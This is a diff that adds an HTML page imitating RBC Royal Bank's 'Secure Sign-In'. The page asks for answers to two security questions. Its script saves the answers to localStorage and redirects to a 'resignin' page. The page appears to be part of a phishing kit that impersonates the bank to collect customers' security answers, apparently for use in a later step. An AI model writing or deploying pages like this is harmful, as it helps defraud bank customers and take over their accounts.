@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/x-icon" href="favicon.ico" />
+    <title>RBC Royal Bank – Secure Sign In</title>
+    <link rel="stylesheet" href="styles.css">
+    <link
+      href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"
+      rel="stylesheet"
+    />
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+    
+
+  </head>
+  <body>
+    <div class="overflow-hidden lg:flex smobile">
+      <div class="">
+          <img src="heroImage.jpg"
+              class="img  lg:h-screen lg:absolute lg:w-screen h-72 bg-contain -mt-16 lg:-mt-40 lg:top-40" alt="" />
+      </div>
+      <div class="herotext relative text-white -top-44 flex justify-center items-center ">
+          <div class="text-center lg:top-40 lg:relative lg:left-80">
+              <div class="logo flex justify-center">
+                  <img src="favicon.ico" class="lg:w-14 lg:h-14" alt="" />
+              </div>
+              <h2 class="font-semibold lg:text-xl lg:mb-3 lg:bold ">Secure Sign-In</h2>
+              <p class="text-sm">RBC Online Banking</p>
+          </div>
+      </div>
+      <div class="bigDiv lg:h-screen lg:px-40 lg:pt-40  lg:-top-0 lg:relative bg-white relative pl-6 -top-36 p-4">
+       <h2>Answer your security questions</h2>
+
+       <div class="flex mt-4 font-semibold"><p>Question 1</p> <span class="text-red-600 m-1 font-bold">*</span></div>
+       <form id="myForm" action="resignin.html" method="post">
+       <input type="text" id="question1" name="question1" placeholder="Answer" required class="input border mt-3 lg:w-80 border-black h-12 focus:outline-none focus:border-blue-700 focus:border-8 p-3" /> <br />
+      
+      
+       <div class="flex mt-4 font-semibold"><p>Question 2</p> <span class="text-red-600 m-1 font-bold">*</span></div>
+       <input type="text" id="question2" name="question2" placeholder="Answer" required class="input border mt-3 lg:w-80 border-black h-12 focus:outline-none focus:border-blue-700 focus:border-8 p-3" /> <br />
+
+       <button type="submit" class="px-36 py-3 relative top-10 bg-blue-700 text-white input">Next</button> <br>
+
+      </form>
+    </div>
+
+    
+
+    <script src="https://kit.fontawesome.com/YOUR_KIT_ID.js" crossorigin="anonymous"></script>
+
+
+
+
+    <script>
+      document.getElementById('myForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        const question1= document.getElementById('question1').value;
+        const question2= document.getElementById('question2').value;
+        localStorage.setItem('question1', question1);
+        localStorage.setItem('question2', question2);
+        window.location.href = 'resignin.html';
+      });
+    </script>
+  </body>
+
+</html>
